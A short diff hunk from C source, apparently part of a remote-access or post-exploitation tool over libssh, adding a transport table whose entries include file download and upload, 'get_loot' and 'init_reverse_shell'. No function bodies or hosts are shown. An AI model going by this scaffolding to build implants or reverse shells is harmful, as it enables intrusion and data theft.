@@ -7,7 +7,12 @@ ssh_bind sshbind;
 ssh_session session;
 ssh_channel channel;
 pClientDat data;
-    
+
+transport_t transport_api = {
+    send_ok, send_err, listen, read, write,
+    download_file, get_loot, upload_file, get_info,
+    init_reverse_shell, determine_handler, init, end
+};
 
 int init(pClientDat dat)
 {
